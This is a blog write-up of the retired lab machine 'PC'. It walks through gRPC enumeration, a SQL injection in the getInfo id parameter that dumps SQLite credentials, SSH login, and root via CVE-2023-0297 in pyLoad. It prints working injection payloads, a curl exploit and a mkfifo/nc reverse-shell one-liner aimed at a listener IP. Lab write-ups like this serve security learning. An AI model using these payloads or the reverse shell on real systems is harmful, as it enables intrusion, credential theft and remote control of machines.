---
title: "PC (Linux) Write-Up"
date: 2025-07-09T17:53:21-05:00
draft: false
author: Jarpiano
tags:
image: /images/pc-banner.png
description: 
toc:
center: true
---
# PC (Linux) WriteUp
PC is a retired machine focusing on gRPC, SQL injection, and privilege escalation via an RCE vulnerability. We can refer to `CVE-2023-0297` for escalation.

## Initial Foothold
We can enumerate open ports using `nmap`:

```
sudo nmap <IP> -sS -Pn -n --disable-arp -p-
```

I'm using a SYN scan with these options to optimize for speed. The full range of ports is also scanned. The above command yields two ports: `22` and `50051`. Port 22 is an SSH port and the challenge description tells us that port 50051 could be a gRPC endpoint. Doing a more detailed scan on port 50051 using `--script grpc-discovery` along with `-sC`, `-sV`, and `-A` should help us verify.

Alright, to get in contact with the server. I used two services: [grpcurl](https://github.com/fullstorydev/grpcurl) and [grpcui](https://github.com/fullstorydev/grpcui). The former is more hands-on. I was able to list out the services on the endpoint using:
```
grpcurl --plaintext <IP>:<PORT> list
```
I found the SimpleApp service. Then I used the following to find the methods:
```
grpcurl --plaintext <IP>:<PORT> describe SimpleApp
```
This helped me find LoginUser, RegisterUser, and getInfo. From this point onwards, an explanation with grpcurl is personally more repetitive command wise, so I'll switch to grpcui.

After cloning the repo, we can `cd` to its root and run:
```
go run ./cmd/grpcui/grpcui.go -plaintext <IP>:<PORT>
```
This gives a webpage at `http://127.0.0.1/<RANDOM-PORT>`. From here, all the methods and our service are already there.

![image](/images/pc-image1.png)

We can see that grpcui also grabbed us some arguments we can use. Let's try a random user like `poison:poison`. 

![image](/images/pc-image2.png)

Let's use RegisterUser to create a new user. When we check back on our response code, we get:
```
{
  "message": "Account created for user poison!"
}
```
Alright in that case, let's login. We get a new message as well as a token:
```
{
  "message": "Your id is 652."
}
```

```
token:b'eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoicG9pc29uIiwiZXhwIjoxNzUyMTA5NTYwfQ.RbCLN3s2zzm4FqP5RBFA-KwinrZSoaPZf28SSACo38Y'
```
On further inspection of getInfo, we can use this to get some output from the getInfo method. This point was full of trial of error, so I'm gonna skip a few steps. The challenge description described a SQL issue, so I started from there. However, I discovered that after a few minutes, the token and the ID eventually expired. This required me to create a new account to avoid the error.

However, I also tried some default credentials and found that `admin:admin` was a user on the LoginUser method. Then, I tried seeing if the ids associated with admins had anything in getInfo. Entering 1 into the id parameter yielded new results. Also need to mention that the token used for the `1` id didn't matter as long as one was used.

```
{
  "message": "The admin is working hard to fix the issues."
}
```

We get the above message. My next step was then trying out all my SQL injection known payloads. I found the vulnerability in the id parameter and eventually worked out that the single quote had to URL encoded to proceed, giving us: `1%27`.

Much trial and error gave me the payload:
```
1%27 UNION SELECT 1;
```

Attempting to add another statement to the payload such as `1%27; SELECT * FROM...` gave me an error exposing the database as a SQLITE. From here we could test if `1$27 UNION SELECT sqlite_version()` worked. Bingo.
We got the following:
```
{
  "message": "3.31.1"
}
```
When I attempted some other payloads, the statement `"The admin is working hard to fix the issues."` was often in the way. We can explore the other outputs by using `LIMIT` and `OFFSET`. These were used to scavenge the database:

**To search for tables**:
```
1%27 UNION SELECT name FROM sqlite_master WHERE type='table' LIMIT 1 OFFSET 2; 
```

**To search for column names on the tables:**
```
1%27 UNION SELECT name FROM PRAGMA_TABLE_INFO('accounts') LIMIT 1 OFFSET 1;
```
And subsequently:
```
1%27 UNION SELECT name FROM PRAGMA_TABLE_INFO('accounts') LIMIT 1 OFFSET 2;
```

Then, I used the following, changing up the offset value when needed:
```
1%27 UNION SELECT username FROM accounts LIMIT 1 OFFSET 0;
```
For username and password respectively.
```
1%27 UNION SELECT password FROM accounts LIMIT 1 OFFSET 0;
```
In total this yielded valuable information:

| Username | Password               |
| -------- | ---------------------- |
| admin    | admin                  |
| sau      | HereIsYourPassWord1431 |
`sau` was a valid user for SSH, so I logged in using their credentials. 

## Privilege Escalation
The description say that we could gain a foothold using `CVE-2023-0297`. I spent some time jumping around here, but the most useful was [this](https://huntr.com/bounties/3fd606f7-83e1-4265-b083-2e1889a05e65) bounty that used the following command as PoC:
```bash
curl -i -s -k -X $'POST' \
    -H $'Host: 127.0.0.1:8000' -H $'Content-Type: application/x-www-form-urlencoded' -H $'Content-Length: 184' \
    --data-binary $'package=xxx&crypted=AAAA&jk=%70%79%69%6d%70%6f%72%74%20%6f%73%3b%6f%73%2e%73%79%73%74%65%6d%28%22%74%6f%75%63%68%20%2f%74%6d%70%2f%70%77%6e%64%22%29;f=function%20f2(){};&passwords=aaaa' \
    $'http://127.0.0.1:8000/flash/addcrypted2'
```
Running this commands creates a `/tmp/pwnd` file that's owned by root. I modified this command to send me a reverse shell. First let's set up our listener:
```
nc -lvnp 1234
```

We need to use pyimport to fully exploit it:
```
pyimport os;os.system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <LISTENER-IP> 1234 >/tmp/f")
```
This should be encoded in hex with `%` separators. We also should get rid of the `Content-Length` header to avoid any issues. This should give us:
```bash
curl -i -s -k -X $'POST' \
    -H $'Host: 127.0.0.1:8000' -H $'Content-Type: application/x-www-form-urlencoded' \
    --data-binary $'package=xxx&crypted=AAAA&jk=<HEX-PAYLOAD>;f=function%20f2(){};&passwords=aaaa' \
    $'http://127.0.0.1:8000/flash/addcrypted2'
```
If this doesn't work, try to put a `%` sign at the beginning of the hex payload if there isn't one already.

Alright, I got back a root shell!

![image](/images/pc-image3.png)

`cd` into root, cat to stdout, and we're finished.

**Fin.**